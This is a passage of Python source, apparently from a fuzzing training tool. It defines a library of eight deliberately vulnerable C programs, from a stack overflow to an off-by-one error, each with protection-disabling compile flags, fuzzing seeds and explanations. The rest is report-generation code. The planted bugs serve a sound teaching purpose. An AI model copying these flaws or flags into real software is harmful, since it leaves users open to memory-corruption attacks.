            "headline": f"{len(crashes)} crash{'es' if len(crashes) > 1 else ''} found",
            "subtext": f"Most severe: {most_severe.title}",
            "breakdown": {
                "critical": sum(1 for c in crashes if c.severity == CrashSeverityLevel.CRITICAL),
                "high": sum(1 for c in crashes if c.severity == CrashSeverityLevel.HIGH),
                "medium": sum(1 for c in crashes if c.severity == CrashSeverityLevel.MEDIUM),
                "low": sum(1 for c in crashes if c.severity == CrashSeverityLevel.LOW),
            },
        }


# =============================================================================
# ONE-CLICK EXAMPLES (Feature 17) - Pre-loaded vulnerable sample binaries
# =============================================================================

class VulnerabilityType(Enum):
    """Types of vulnerabilities in example binaries."""
    BUFFER_OVERFLOW = "buffer_overflow"
    HEAP_OVERFLOW = "heap_overflow"
    USE_AFTER_FREE = "use_after_free"
    FORMAT_STRING = "format_string"
    INTEGER_OVERFLOW = "integer_overflow"
    NULL_DEREFERENCE = "null_dereference"
    DOUBLE_FREE = "double_free"
    OFF_BY_ONE = "off_by_one"
    STACK_EXHAUSTION = "stack_exhaustion"
    UNINITIALIZED_MEMORY = "uninitialized_memory"


class ExampleDifficulty(Enum):
    """Difficulty levels for practice examples."""
    BEGINNER = "beginner"
    INTERMEDIATE = "intermediate"
    ADVANCED = "advanced"


@dataclass
class ExampleBinary:
    """A pre-loaded vulnerable example binary for practice."""
    id: str
    name: str
    description: str
    vulnerability_type: VulnerabilityType
    difficulty: ExampleDifficulty
    source_code: str
    expected_crash_type: str
    hints: List[str]
    learning_objectives: List[str]
    suggested_seeds: List[bytes]
    compilation_flags: str
    estimated_time_to_crash: str  # e.g., "< 1 minute", "1-5 minutes"
    explanation: str  # What the vulnerability is and why it crashes
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "name": self.name,
            "description": self.description,
            "vulnerability_type": self.vulnerability_type.value,
            "difficulty": self.difficulty.value,
            "source_code": self.source_code,
            "expected_crash_type": self.expected_crash_type,
            "hints": self.hints,
            "learning_objectives": self.learning_objectives,
            "suggested_seeds": [base64.b64encode(s).decode() for s in self.suggested_seeds],
            "compilation_flags": self.compilation_flags,
            "estimated_time_to_crash": self.estimated_time_to_crash,
            "explanation": self.explanation,
        }


class OneClickExampleLibrary:
    """
    Library of pre-loaded vulnerable binaries for fuzzing practice.
    
    Provides beginners with safe, controlled examples to learn fuzzing
    without needing to find their own targets.
    """
    
    def __init__(self, examples_dir: str = "/fuzzing/examples"):
        self.examples_dir = Path(examples_dir)
        self.examples_dir.mkdir(parents=True, exist_ok=True)
        self._examples = self._create_example_library()
    
    def _create_example_library(self) -> Dict[str, ExampleBinary]:
        """Create the library of vulnerable example programs."""
        examples = {}
        
        # Example 1: Simple Buffer Overflow (Beginner)
        examples["simple_overflow"] = ExampleBinary(
            id="simple_overflow",
            name="Simple Buffer Overflow",
            description="A basic stack buffer overflow vulnerable to long inputs",
            vulnerability_type=VulnerabilityType.BUFFER_OVERFLOW,
            difficulty=ExampleDifficulty.BEGINNER,
            source_code='''
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buffer[64];  // Small buffer
    
    if (argc < 2) {
        printf("Usage: %s <input>\\n", argv[0]);
        return 1;
    }
    
    // VULNERABILITY: No bounds checking!
    strcpy(buffer, argv[1]);
    
    printf("You entered: %s\\n", buffer);
    return 0;
}
''',
            expected_crash_type="Stack Buffer Overflow / Segmentation Fault",
            hints=[
                "Try inputs longer than 64 characters",
                "The buffer is only 64 bytes but strcpy doesn't check length",
                "Watch for SIGSEGV signals in the crash output",
            ],
            learning_objectives=[
                "Understand how buffer overflows occur",
                "Learn to recognize stack smashing crashes",
                "See how fuzzing finds edge cases automatically",
            ],
            suggested_seeds=[
                b"AAAA",
                b"A" * 32,
                b"test input",
            ],
            compilation_flags="-fno-stack-protector -z execstack",
            estimated_time_to_crash="< 1 minute",
            explanation="""
This is the classic buffer overflow vulnerability. The program allocates a 64-byte 
buffer on the stack but uses strcpy() which doesn't check the length of the input.
When you provide input longer than 64 bytes, it overwrites adjacent memory on the 
stack, eventually corrupting the return address and causing a crash.

In real exploits, attackers can control the return address to redirect execution 
to their own code. This is why buffer overflows are so dangerous!
""",
        )
        
        # Example 2: Heap Overflow (Intermediate)
        examples["heap_overflow"] = ExampleBinary(
            id="heap_overflow",
            name="Heap Buffer Overflow",
            description="Heap-based buffer overflow with malloc'd memory",
            vulnerability_type=VulnerabilityType.HEAP_OVERFLOW,
            difficulty=ExampleDifficulty.INTERMEDIATE,
            source_code='''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct record {
    char name[32];
    int important_value;
    void (*callback)(void);
};

void safe_function() {
    printf("Safe function called\\n");
}

int main(int argc, char *argv[]) {
    struct record *rec = malloc(sizeof(struct record));
    
    if (!rec || argc < 2) return 1;
    
    rec->important_value = 42;
    rec->callback = safe_function;
    
    // VULNERABILITY: Overflow into adjacent heap memory
    strcpy(rec->name, argv[1]);
    
    printf("Name: %s\\n", rec->name);
    printf("Value: %d\\n", rec->important_value);
    
    // Call the function pointer (can be overwritten!)
    if (rec->callback) rec->callback();
    
    free(rec);
    return 0;
}
''',
            expected_crash_type="Heap Corruption / Invalid Function Pointer",
            hints=[
                "The name field is only 32 bytes",
                "Overflowing name can corrupt important_value and callback",
                "Try to overwrite the function pointer with garbage",
            ],
            learning_objectives=[
                "Understand heap vs stack overflows",
                "Learn about struct memory layout",
                "See how function pointers can be hijacked",
            ],
            suggested_seeds=[
                b"Alice",
                b"A" * 40,
                b"B" * 50,
            ],
            compilation_flags="-fno-stack-protector",
            estimated_time_to_crash="1-2 minutes",
            explanation="""
This demonstrates a heap-based buffer overflow. The 'name' field in the struct 
is only 32 bytes, but strcpy copies unlimited data. Since the struct is 
allocated on the heap, overflowing 'name' corrupts adjacent struct members:
first 'important_value', then 'callback' (a function pointer).

When the corrupted callback is called, the program tries to execute code at 
an invalid address, causing a crash. In real exploits, attackers might 
redirect this to their own code!
""",
        )
        
        # Example 3: Use After Free (Intermediate)
        examples["use_after_free"] = ExampleBinary(
            id="use_after_free",
            name="Use After Free",
            description="Dangling pointer vulnerability after free()",
            vulnerability_type=VulnerabilityType.USE_AFTER_FREE,
            difficulty=ExampleDifficulty.INTERMEDIATE,
            source_code='''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct object {
    char data[64];
    void (*process)(char*);
};

void print_data(char *data) {
    printf("Data: %s\\n", data);
}

int main(int argc, char *argv[]) {
    struct object *obj1 = malloc(sizeof(struct object));
    struct object *obj2 = NULL;
    
    if (!obj1 || argc < 3) return 1;
    
    obj1->process = print_data;
    strncpy(obj1->data, argv[1], 63);
    
    // Free the first object
    free(obj1);
    // obj1 is now dangling!
    
    // Allocate new object (might reuse freed memory)
    obj2 = malloc(sizeof(struct object));
    strncpy(obj2->data, argv[2], 63);
    obj2->process = NULL;  // No callback set
    
    // VULNERABILITY: Using freed pointer!
    obj1->process(obj1->data);  // UAF!
    
    free(obj2);
    return 0;
}
''',
            expected_crash_type="Use After Free / Invalid Memory Access",
            hints=[
                "obj1 is freed but then used again",
                "The second malloc might reuse obj1's memory",
                "obj2's data overwrites obj1's function pointer",
            ],
            learning_objectives=[
                "Understand use-after-free vulnerabilities",
                "Learn about heap memory reuse",
                "See why dangling pointers are dangerous",
            ],
            suggested_seeds=[
                b"first",
                b"second",
                b"A" * 64,
            ],
            compilation_flags="-fno-stack-protector",
            estimated_time_to_crash="2-5 minutes",
            explanation="""
This is a Use After Free (UAF) vulnerability. After obj1 is freed, the pointer 
becomes 'dangling' - it still points to memory that's no longer allocated.

When obj2 is allocated, the heap allocator often reuses the recently freed 
memory (for efficiency). This means obj2 occupies the same memory as obj1 did.

When we access obj1->process after this, we're actually reading obj2's data 
as a function pointer! Since obj2->process was set to NULL but the memory 
layout means obj1->process reads from a different offset, we get corruption.
""",
        )
        
        # Example 4: Format String (Intermediate)
        examples["format_string"] = ExampleBinary(
            id="format_string",
            name="Format String Vulnerability",
            description="Printf with user-controlled format string",
            vulnerability_type=VulnerabilityType.FORMAT_STRING,
            difficulty=ExampleDifficulty.INTERMEDIATE,
            source_code='''
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buffer[256];
    int secret = 0x41414141;
    
    if (argc < 2) return 1;
    
    strncpy(buffer, argv[1], 255);
    buffer[255] = '\\0';
    
    printf("Your input: ");
    // VULNERABILITY: User controls format string!
    printf(buffer);
    printf("\\n");
    
    printf("Secret value: 0x%x\\n", secret);
    return 0;
}
''',
            expected_crash_type="Format String / Memory Read/Write",
            hints=[
                "Try format specifiers like %s, %x, %n",
                "The printf uses user input directly as format",
                "%s tries to read a string from the stack",
            ],
            learning_objectives=[
                "Understand format string vulnerabilities",
                "Learn how printf interprets format specifiers",
                "See how attackers can read/write memory",
            ],
            suggested_seeds=[
                b"hello",
                b"%x%x%x%x",
                b"%s%s%s%s",
            ],
            compilation_flags="-Wno-format-security",
            estimated_time_to_crash="1-3 minutes",
            explanation="""
Format string vulnerabilities occur when user input is passed directly to 
printf() as the format string. Format specifiers like %x, %s, %n have 
special meanings:
- %x: Read and print a value from the stack as hex
- %s: Read and print a string from an address on the stack
- %n: WRITE the number of bytes printed to an address

When the fuzzer sends %s%s%s, printf tries to read string pointers from 
the stack. Since those aren't valid pointers, it crashes with SIGSEGV.
Attackers can use %n to write arbitrary values to memory!
""",
        )
        
        # Example 5: Integer Overflow (Intermediate)
        examples["integer_overflow"] = ExampleBinary(
            id="integer_overflow",
            name="Integer Overflow",
            description="Integer overflow leading to buffer overflow",
            vulnerability_type=VulnerabilityType.INTEGER_OVERFLOW,
            difficulty=ExampleDifficulty.INTERMEDIATE,
            source_code='''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    unsigned int size;
    char *buffer;
    
    if (argc < 3) {
        printf("Usage: %s <size> <data>\\n", argv[0]);
        return 1;
    }
    
    size = atoi(argv[1]);
    
    // VULNERABILITY: Integer overflow in size calculation
    // Adding 1 for null terminator can wrap around!
    buffer = malloc(size + 1);
    
    if (!buffer) {
        printf("Allocation failed\\n");
        return 1;
    }
    
    // If size was UINT_MAX, malloc(0) succeeded
    // but we copy much more data!
    strncpy(buffer, argv[2], size);
    buffer[size] = '\\0';
    
    printf("Stored: %s\\n", buffer);
    free(buffer);
    return 0;
}
''',
            expected_crash_type="Integer Overflow / Heap Corruption",
            hints=[
                "What happens when size is 4294967295 (UINT_MAX)?",
                "size + 1 wraps around to 0",
                "malloc(0) returns a valid pointer but tiny allocation",
            ],
            learning_objectives=[
                "Understand integer overflow vulnerabilities",
                "Learn about unsigned integer wraparound",
                "See how math bugs lead to memory corruption",
            ],
            suggested_seeds=[
                b"100 test",
                b"4294967295 AAAA",
                b"-1 overflow",
            ],
            compilation_flags="-fno-stack-protector",
            estimated_time_to_crash="3-5 minutes",
            explanation="""
Integer overflow is a subtle but dangerous vulnerability. When size is 
UINT_MAX (4294967295), adding 1 causes it to wrap around to 0!

malloc(0) is implementation-defined but often returns a valid tiny 
allocation. Then strncpy copies 'size' bytes (billions!) into this tiny 
buffer, causing massive heap corruption.

This is why security-critical code must check for integer overflow before 
arithmetic operations, especially when calculating buffer sizes.
""",
        )
        
        # Example 6: Null Dereference (Beginner)
        examples["null_deref"] = ExampleBinary(
            id="null_deref",
            name="Null Pointer Dereference",
            description="Missing null check before pointer use",
            vulnerability_type=VulnerabilityType.NULL_DEREFERENCE,
            difficulty=ExampleDifficulty.BEGINNER,
            source_code='''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char* get_config(const char *name) {
    if (strcmp(name, "valid") == 0) {
        char *config = malloc(64);
        strcpy(config, "configuration data");
        return config;
    }
    // Returns NULL for invalid names
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    
    char *config = get_config(argv[1]);
    
    // VULNERABILITY: No null check!
    printf("Config length: %zu\\n", strlen(config));
    printf("Config: %s\\n", config);
    
    free(config);
    return 0;
}
''',
            expected_crash_type="Null Pointer Dereference / SIGSEGV",
            hints=[
                "What happens when you pass anything except 'valid'?",
                "get_config returns NULL for invalid names",
                "strlen(NULL) crashes immediately",
            ],
            learning_objectives=[
                "Understand null pointer dereferences",
                "Learn importance of null checks",
                "See how missing validation causes crashes",
            ],
            suggested_seeds=[
                b"valid",
                b"invalid",
                b"test",
            ],
            compilation_flags="",
            estimated_time_to_crash="< 30 seconds",
            explanation="""
Null pointer dereference is one of the most common bugs. When get_config() 
is called with any name except "valid", it returns NULL. The main function 
doesn't check for this and immediately passes the NULL pointer to strlen().

Dereferencing NULL (address 0x0) causes a segmentation fault because that 
memory is never mapped to your process. While often just a crash, null 
dereference can sometimes be exploited if attackers can map address 0.

Always check pointers before use!
""",
        )
        
        # Example 7: Double Free (Advanced)
        examples["double_free"] = ExampleBinary(
            id="double_free",
            name="Double Free",
            description="Freeing the same memory twice",
            vulnerability_type=VulnerabilityType.DOUBLE_FREE,
            difficulty=ExampleDifficulty.ADVANCED,
            source_code='''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct node {
    char *data;
    struct node *next;
};

struct node* create_node(const char *data) {
    struct node *n = malloc(sizeof(struct node));
    n->data = strdup(data);
    n->next = NULL;
    return n;
}

void delete_node(struct node *n) {
    free(n->data);
    free(n);
}

int main(int argc, char *argv[]) {
    if (argc < 3) return 1;
    
    struct node *head = create_node(argv[1]);
    struct node *second = create_node(argv[2]);
    head->next = second;
    
    // Delete second node
    delete_node(second);
    
    // VULNERABILITY: second is already freed!
    // But head->next still points to it
    if (strcmp(argv[1], "delete") == 0) {
        // Double free through dangling pointer!
        delete_node(head->next);
    }
    
    delete_node(head);
    return 0;
}
''',
            expected_crash_type="Double Free / Heap Corruption",
            hints=[
                "Use 'delete' as the first argument",
                "second is freed but head->next still points to it",
                "Freeing the same memory twice corrupts heap metadata",
            ],
            learning_objectives=[
                "Understand double free vulnerabilities",
                "Learn about heap metadata corruption",
                "See why memory management is critical",
            ],
            suggested_seeds=[
                b"delete test",
                b"keep data",
                b"delete AAAA",
            ],
            compilation_flags="-fno-stack-protector",
            estimated_time_to_crash="1-3 minutes",
            explanation="""
Double free is a heap corruption vulnerability. When you free() memory, the 
allocator marks it as available and may modify its contents (adding it to a 
free list). If you free the same memory again, you corrupt the heap's 
internal data structures.

In this example, 'second' is freed, but head->next still points to that 
freed memory. When the first argument is "delete", we free second again 
through the dangling head->next pointer.

Modern allocators detect some double frees, but attackers can often bypass 
these checks. Double free can lead to arbitrary code execution!
""",
        )
        
        # Example 8: Off By One (Intermediate)
        examples["off_by_one"] = ExampleBinary(
            id="off_by_one",
            name="Off By One Error",
            description="Classic off-by-one buffer overflow",
            vulnerability_type=VulnerabilityType.OFF_BY_ONE,
            difficulty=ExampleDifficulty.INTERMEDIATE,
            source_code='''
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buffer[64];
    char canary[8] = "CANARY!";
    int i;
    
    if (argc < 2) return 1;
    
    // VULNERABILITY: <= instead of <
    for (i = 0; i <= sizeof(buffer); i++) {
        if (argv[1][i] == '\\0') break;
        buffer[i] = argv[1][i];
    }
    buffer[i] = '\\0';  // Null terminate
    
    printf("Buffer: %s\\n", buffer);
    printf("Canary: %s\\n", canary);
    
    // Check if canary was corrupted
    if (strcmp(canary, "CANARY!") != 0) {
        printf("CANARY CORRUPTED! Off-by-one detected!\\n");
        // In real code, this might trigger other crashes
        abort();
    }
    
    return 0;
}
''',
            expected_crash_type="Off By One / Memory Corruption",
            hints=[
                "The loop uses <= instead of <",
                "This allows writing one byte past the buffer",
                "That extra byte overwrites adjacent memory (canary)",
            ],
            learning_objectives=[
                "Understand off-by-one errors",
                "Learn about fence-post bugs",
                "See how single byte overwrite can be exploited",
            ],
            suggested_seeds=[
                b"short",
                b"A" * 64,
                b"B" * 65,
            ],
            compilation_flags="-fno-stack-protector",
            estimated_time_to_crash="1-2 minutes",
            explanation="""
Off-by-one errors are subtle bugs where you access one element past the 
end of an array. Here, the loop condition uses <= instead of <, allowing 
buffer[64] to be written (but buffer only has indices 0-63).

This single extra byte overwrites the first byte of 'canary', which is 
adjacent in memory. The canary string changes from "CANARY!" to something 
else, triggering our detection.

In real exploits, that one byte might overwrite a saved frame pointer, 
allowing attackers to redirect execution. Never underestimate off-by-one!
""",
        )
        
        return examples
    
    def list_examples(
        self,
        difficulty: Optional[ExampleDifficulty] = None,
        vulnerability_type: Optional[VulnerabilityType] = None,
    ) -> List[Dict[str, Any]]:
        """List available examples with optional filtering."""
        results = []
        
        for example in self._examples.values():
            if difficulty and example.difficulty != difficulty:
                continue
            if vulnerability_type and example.vulnerability_type != vulnerability_type:
                continue
            
            results.append({
                "id": example.id,
                "name": example.name,
                "description": example.description,
                "vulnerability_type": example.vulnerability_type.value,
                "difficulty": example.difficulty.value,
                "estimated_time_to_crash": example.estimated_time_to_crash,
            })
        
        return results
    
    def get_example(self, example_id: str) -> Optional[ExampleBinary]:
        """Get a specific example by ID."""
        return self._examples.get(example_id)
    
    def get_example_details(self, example_id: str) -> Optional[Dict[str, Any]]:
        """Get full details for an example."""
        example = self._examples.get(example_id)
        if example:
            return example.to_dict()
        return None
    
    def compile_example(
        self,
        example_id: str,
        output_dir: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Compile an example binary for fuzzing.
        
        Returns compilation result and path to binary.
        """
        example = self._examples.get(example_id)
        if not example:
            return {
                "success": False,
                "error": f"Example '{example_id}' not found",
            }
        
        output_path = Path(output_dir) if output_dir else self.examples_dir
        output_path.mkdir(parents=True, exist_ok=True)
        
        source_file = output_path / f"{example_id}.c"
        binary_file = output_path / example_id
        
        # Write source code
        with open(source_file, "w") as f:
            f.write(example.source_code)
        
        # Compile with specified flags
        try:
            compile_cmd = f"gcc {example.compilation_flags} -o {binary_file} {source_file}"
            result = subprocess.run(
                compile_cmd.split(),
                capture_output=True,
                text=True,
                timeout=30,
            )
            
            if result.returncode != 0:
                return {
                    "success": False,
                    "error": f"Compilation failed: {result.stderr}",
                    "command": compile_cmd,
                }
            
            return {
                "success": True,
                "binary_path": str(binary_file),
                "source_path": str(source_file),
                "compilation_flags": example.compilation_flags,
                "message": f"Successfully compiled {example.name}",
            }
            
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Compilation timed out",
            }
        except Exception as e:
            return {
                "success": False,
                "error": f"Compilation error: {str(e)}",
            }
    
    def get_recommended_settings(self, example_id: str) -> Optional[Dict[str, Any]]:
        """Get recommended fuzzing settings for an example."""
        example = self._examples.get(example_id)
        if not example:
            return None
        
        return {
            "example_id": example_id,
            "example_name": example.name,
            "suggested_seeds": [base64.b64encode(s).decode() for s in example.suggested_seeds],
            "recommended_timeout_ms": 1000,
            "recommended_memory_limit_mb": 256,
            "recommended_mutation_strategy": "balanced",
            "expected_time_to_find_crash": example.estimated_time_to_crash,
            "tips": example.hints,
        }
    
    def get_tutorial(self, example_id: str) -> Optional[Dict[str, Any]]:
        """Get a step-by-step tutorial for fuzzing an example."""
        example = self._examples.get(example_id)
        if not example:
            return None
        
        return {
            "example_id": example_id,
            "example_name": example.name,
            "difficulty": example.difficulty.value,
            "learning_objectives": example.learning_objectives,
            "steps": [
                {
                    "step": 1,
                    "title": "Understand the Vulnerability",
                    "description": "Read the source code and identify the bug",
                    "details": example.explanation,
                },
                {
                    "step": 2,
                    "title": "Compile the Binary",
                    "description": "Compile with the right flags to make it vulnerable",
                    "command": f"gcc {example.compilation_flags} -o {example.id} {example.id}.c",
                },
                {
                    "step": 3,
                    "title": "Create Seed Inputs",
                    "description": "Start with these suggested seeds",
                    "seeds": [s.decode('utf-8', errors='replace') for s in example.suggested_seeds],
                },
                {
                    "step": 4,
                    "title": "Start Fuzzing",
                    "description": "Run the fuzzer and wait for crashes",
                    "tips": example.hints,
                },
                {
                    "step": 5,
                    "title": "Analyze Crashes",
                    "description": "When you find a crash, examine the output",
                    "expected_crash": example.expected_crash_type,
                },
            ],
            "hints": example.hints,
        }
    
    def get_categories(self) -> Dict[str, Any]:
        """Get all vulnerability categories with counts."""
        categories = {}
        difficulties = {}
        
        for example in self._examples.values():
            vtype = example.vulnerability_type.value
            diff = example.difficulty.value
            
            categories[vtype] = categories.get(vtype, 0) + 1
            difficulties[diff] = difficulties.get(diff, 0) + 1
        
        return {
            "vulnerability_types": categories,
            "difficulties": difficulties,
            "total_examples": len(self._examples),
        }


# =============================================================================
# FINAL REPORT GENERATOR - AI-powered comprehensive fuzzing reports
# =============================================================================

class ReportFormat(Enum):
    """Supported report export formats."""
    MARKDOWN = "markdown"
    PDF = "pdf"
    WORD = "word"
    HTML = "html"
    JSON = "json"


@dataclass
class ReportSection:
    """A section in the final report."""
    title: str
    content: str
    subsections: List["ReportSection"] = field(default_factory=list)
    charts: List[Dict[str, Any]] = field(default_factory=list)
    tables: List[Dict[str, Any]] = field(default_factory=list)


@dataclass
class FinalReport:
    """Complete fuzzing report with all analysis."""
    id: str
    title: str
    session_id: str
    generated_at: str
    executive_summary: str
    sections: List[ReportSection]
    metadata: Dict[str, Any]
    statistics: Dict[str, Any]
    recommendations: List[str]
    risk_assessment: Dict[str, Any]
    
    def to_dict(self) -> Dict[str, Any]:
        def section_to_dict(section: ReportSection) -> Dict[str, Any]:
            return {
                "title": section.title,
                "content": section.content,
                "subsections": [section_to_dict(s) for s in section.subsections],
                "charts": section.charts,
                "tables": section.tables,
            }
        
        return {
            "id": self.id,
            "title": self.title,
            "session_id": self.session_id,
            "generated_at": self.generated_at,
            "executive_summary": self.executive_summary,
            "sections": [section_to_dict(s) for s in self.sections],
            "metadata": self.metadata,
            "statistics": self.statistics,
            "recommendations": self.recommendations,
            "risk_assessment": self.risk_assessment,
        }


class FinalReportGenerator:
    """
    Generates comprehensive AI-powered fuzzing reports.
    
    Creates detailed reports with:
    - Executive summary
    - Crash analysis and triage
    - Coverage metrics
    - Security recommendations
    - Multiple export formats (Markdown, PDF, Word)
    """
    
    def __init__(self, reports_dir: str = "/fuzzing/reports"):
        self.reports_dir = Path(reports_dir)
        self.reports_dir.mkdir(parents=True, exist_ok=True)
        self._reports: Dict[str, FinalReport] = {}
    
    async def generate_report(
        self,
        session_id: str,
        session_data: Dict[str, Any],
        crashes: List[Dict[str, Any]],
        coverage_data: Optional[Dict[str, Any]] = None,
        triage_results: Optional[List[Dict[str, Any]]] = None,
        include_ai_analysis: bool = True,
    ) -> FinalReport:
        """
        Generate a comprehensive final report for a fuzzing session.
        
        Args:
            session_id: The fuzzing session ID
            session_data: Session configuration and statistics
            crashes: List of crashes found
            coverage_data: Optional code coverage information
            triage_results: Optional pre-computed triage results
            include_ai_analysis: Whether to include AI-generated insights
        
        Returns:
            FinalReport object with all analysis
        """
        report_id = str(uuid.uuid4())[:8]
        generated_at = datetime.utcnow().isoformat()
        
        # Calculate statistics
        statistics = self._calculate_statistics(session_data, crashes, coverage_data)
        
        # Generate executive summary
        executive_summary = self._generate_executive_summary(
            session_data, crashes, statistics, triage_results
        )
        
        # Build report sections
        sections = []
        
        # Section 1: Session Overview
        sections.append(self._create_overview_section(session_data))
        
        # Section 2: Crash Analysis
        sections.append(self._create_crash_section(crashes, triage_results))
        
        # Section 3: Coverage Analysis
        if coverage_data:
            sections.append(self._create_coverage_section(coverage_data))
        
        # Section 4: Security Assessment
        sections.append(self._create_security_section(crashes, triage_results))
        
        # Section 5: Technical Details
        sections.append(self._create_technical_section(session_data, crashes))
        
        # Generate recommendations
        recommendations = self._generate_recommendations(crashes, triage_results, statistics)
        
        # Risk assessment
        risk_assessment = self._assess_risk(crashes, triage_results)
        
        # Create final report
        report = FinalReport(
            id=report_id,
            title=f"Fuzzing Report - {session_data.get('target_name', 'Unknown Target')}",
            session_id=session_id,
            generated_at=generated_at,
            executive_summary=executive_summary,
            sections=sections,
            metadata={
                "target_path": session_data.get("target_path", "Unknown"),
                "fuzzing_mode": session_data.get("fuzzing_mode", "Unknown"),
                "duration_seconds": session_data.get("duration_seconds", 0),
                "total_executions": session_data.get("total_executions", 0),
            },
            statistics=statistics,
            recommendations=recommendations,
            risk_assessment=risk_assessment,
        )
        
        # Store and auto-save
        self._reports[report_id] = report
        await self._auto_save_report(report)
        
        return report
    
    def _calculate_statistics(
        self,
        session_data: Dict[str, Any],
        crashes: List[Dict[str, Any]],
        coverage_data: Optional[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Calculate comprehensive statistics."""
        total_executions = session_data.get("total_executions", 0)
        duration_seconds = session_data.get("duration_seconds", 0)
        
        # Crash statistics
        crash_types = {}
        for crash in crashes:
            ctype = crash.get("crash_type", "unknown")
            crash_types[ctype] = crash_types.get(ctype, 0) + 1
        
        # Severity breakdown
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for crash in crashes:
            severity = crash.get("severity", "medium").lower()
            if severity in severity_counts:
                severity_counts[severity] += 1
        
        return {
            "total_executions": total_executions,
            "executions_per_second": total_executions / max(duration_seconds, 1),
            "duration_seconds": duration_seconds,
            "duration_formatted": self._format_duration(duration_seconds),
            "total_crashes": len(crashes),
            "unique_crashes": len(set(c.get("input_hash", "") for c in crashes)),
            "crash_types": crash_types,
            "severity_breakdown": severity_counts,
            "crash_rate": len(crashes) / max(total_executions, 1),
            "coverage_percentage": coverage_data.get("percentage", 0) if coverage_data else None,
        }
    
    def _format_duration(self, seconds: float) -> str:
        """Format duration in human-readable form."""
        if seconds < 60:
            return f"{seconds:.1f} seconds"
        elif seconds < 3600:
            return f"{seconds / 60:.1f} minutes"
        else:
            return f"{seconds / 3600:.1f} hours"
    
    def _generate_executive_summary(
        self,
        session_data: Dict[str, Any],
        crashes: List[Dict[str, Any]],
        statistics: Dict[str, Any],
        triage_results: Optional[List[Dict[str, Any]]],
    ) -> str:
        """Generate AI-style executive summary."""
        target = session_data.get("target_name", session_data.get("target_path", "the target"))
        total_crashes = len(crashes)
        duration = statistics.get("duration_formatted", "unknown")
        
        # Count high-severity issues
        high_severity = 0
        if triage_results:
            high_severity = sum(1 for t in triage_results 
                               if t.get("severity", "").lower() in ["critical", "high"])
        else:
            severity_breakdown = statistics.get("severity_breakdown", {})
            high_severity = severity_breakdown.get("critical", 0) + severity_breakdown.get("high", 0)
        
        # Generate summary paragraphs
        summary_parts = []
        
        # Overview paragraph
        if total_crashes == 0:
            summary_parts.append(
                f"Fuzzing of **{target}** completed after {duration} with "
                f"{statistics.get('total_executions', 0):,} test executions. "
                f"No crashes were discovered during this session, indicating the target "
                f"handled all tested inputs gracefully."
            )
        else:
            summary_parts.append(
                f"Fuzzing of **{target}** completed after {duration} with "
                f"{statistics.get('total_executions', 0):,} test executions. "
                f"**{total_crashes} crashes** were discovered, with "
                f"**{statistics.get('unique_crashes', 0)} unique** crash signatures."
            )
        
        # Risk assessment paragraph
        if high_severity > 0:
            summary_parts.append(
                f"⚠️ **Security Alert**: {high_severity} high or critical severity "
                f"issues were identified that may be exploitable. Immediate attention "
                f"is recommended for these findings."
            )
        elif total_crashes > 0:
            summary_parts.append(
                f"The crashes found appear to be lower severity issues. While they should "
                f"be fixed, they present limited immediate security risk."
            )
        
        # Performance paragraph
        exec_rate = statistics.get("executions_per_second", 0)
        if exec_rate > 1000:
            summary_parts.append(
                f"Performance was excellent at {exec_rate:,.0f} executions per second, "
                f"indicating good fuzzing efficiency."
            )
        elif exec_rate > 100:
            summary_parts.append(
                f"Performance was good at {exec_rate:,.0f} executions per second."
            )
        else:
            summary_parts.append(
                f"Performance was {exec_rate:,.0f} executions per second. Consider "
                f"optimizing the target or using a faster fuzzing mode."
            )
        
        return "\n\n".join(summary_parts)
    
    def _create_overview_section(self, session_data: Dict[str, Any]) -> ReportSection:
        """Create the session overview section."""
        content = f"""
## Session Configuration

| Property | Value |
|----------|-------|
| Target | `{session_data.get('target_path', 'Unknown')}` |
| Fuzzing Mode | {session_data.get('fuzzing_mode', 'Unknown')} |
| Mutation Strategy | {session_data.get('mutation_strategy', 'Unknown')} |
| Timeout | {session_data.get('timeout_ms', 0)} ms |
| Memory Limit | {session_data.get('memory_limit_mb', 0)} MB |
| Start Time | {session_data.get('start_time', 'Unknown')} |
| End Time | {session_data.get('end_time', 'Unknown')} |
"""
        
        return ReportSection(
            title="Session Overview",
            content=content.strip(),
            tables=[{
                "name": "Configuration",
                "data": session_data,
            }],
        )
    
    def _create_crash_section(
        self,
        crashes: List[Dict[str, Any]],
        triage_results: Optional[List[Dict[str, Any]]],
    ) -> ReportSection:
        """Create the crash analysis section."""
        if not crashes:
            return ReportSection(
                title="Crash Analysis",
                content="✅ **No crashes were found during this fuzzing session.**\n\n"
                       "This could mean the target is robust, or that more fuzzing time "
                       "or different mutation strategies might be needed.",
            )
        
        # Build crash summary
        content_parts = [f"## Crash Summary\n\n**{len(crashes)} total crashes found**\n"]
        
        # Severity breakdown
        if triage_results:
            severity_counts = {}
            for t in triage_results:
                sev = t.get("severity", "unknown")
                severity_counts[sev] = severity_counts.get(sev, 0) + 1
            
            content_parts.append("\n### Severity Breakdown\n")
            severity_emoji = {
                "critical": "🚨", "high": "🔴", "medium": "🟡", 
                "low": "🟢", "info": "ℹ️"
            }
            for sev, count in sorted(severity_counts.items(), 
                                     key=lambda x: ["critical", "high", "medium", "low", "info"].index(x[0]) 
                                     if x[0] in ["critical", "high", "medium", "low", "info"] else 99):
                emoji = severity_emoji.get(sev, "•")
                content_parts.append(f"- {emoji} **{sev.title()}**: {count}\n")
        
        # Top crashes
        content_parts.append("\n### Notable Crashes\n")
        for i, crash in enumerate(crashes[:5], 1):
            crash_type = crash.get("crash_type", "Unknown")
            signal = crash.get("signal", "Unknown")
            content_parts.append(
                f"\n#### Crash #{i}: {crash_type}\n"
                f"- **Signal**: {signal}\n"
